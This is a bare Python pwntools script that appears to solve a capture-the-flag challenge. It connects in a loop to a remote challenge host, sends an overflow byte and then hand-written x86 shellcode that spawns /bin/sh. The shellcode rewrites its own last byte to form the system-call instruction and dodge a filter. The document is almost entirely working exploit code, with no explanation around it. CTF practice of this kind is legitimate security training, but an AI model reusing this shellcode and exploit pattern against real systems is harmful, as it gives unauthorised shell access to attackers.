#!/usr/bin/python3

from pwn import *
import sys
"""
if len(sys.argv) > 1:
    r = remote('adl.ctf.tw', 11005)
else:
    r = process('./a')
"""


"""
add eax, 0x1e
mov byte ptr [eax], 0x80
xor  eax,eax
push 0x68
push 0x732f2f6e
nop
push 0x69622f2f
mov    ebx, esp
push   eax
push   ebx
mov    ecx, esp
mov    al, 0xb
"""

## execve('//bin//sh', NULL, NULL)
sc = "\x83\xC0\x1E\xC6\x00\x80\x31\xC0\x6A\x68\x68\x6E\x2F\x2F\x73\x90\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD"
# g => cb
while True:
    r = remote('ctf.adl.tw', 11005)
    r.send(b'lff4567891234567' + b'\xF0')
    r.send(sc) # need last byte to be 0x80
    r.interactive()
    r.close()
